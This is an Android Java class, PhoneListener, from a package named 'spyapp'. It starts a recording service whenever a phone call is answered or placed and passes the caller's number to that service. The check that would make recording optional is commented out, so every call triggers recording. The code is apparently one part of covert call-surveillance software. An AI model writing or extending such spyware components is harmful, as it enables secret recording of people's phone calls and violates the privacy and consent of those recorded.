package com.app.spyapp.receiver;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.app.spyapp.SpyApp;
import com.app.spyapp.service.RecordService;

public class PhoneListener extends PhoneStateListener {
    private Context context;
    private SpyApp spyApp;

    public PhoneListener(Context c) {
        Log.i("CallRecorder", "PhoneListener constructor");
        context = c;
        spyApp = (SpyApp) c.getApplicationContext();
    }

    public void onCallStateChanged(int state, String incomingNumber) {
        Log.d("CallRecorder", "PhoneListener::onCallStateChanged state:" + state + " incomingNumber:" + incomingNumber);

//        if (spyApp.getSharedPreferences().getBoolean(Pref.RECORDCALL, false)) {
            switch (state) {
                case TelephonyManager.CALL_STATE_IDLE:
                    Log.d("CallRecorder", "CALL_STATE_IDLE, stoping recording");
                    Intent intent=new Intent(context, RecordService.class);

                    context.stopService(intent);
                    break;
                case TelephonyManager.CALL_STATE_RINGING:
                    Log.d("CallRecorder", "CALL_STATE_RINGING");
                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK:
                    Log.d("CallRecorder", "CALL_STATE_OFFHOOK starting recording");
                    Intent callIntent = new Intent(context, RecordService.class);
                    callIntent.putExtra("INCOMINGNUMBER",incomingNumber);
                    ComponentName name = context.startService(callIntent);
                    if (null == name) {
                        Log.e("CallRecorder", "startService for RecordService returned null ComponentName");
                    } else {
                        Log.i("CallRecorder", "startService returned " + name.flattenToString());
                    }
                    break;
            }
        }

}
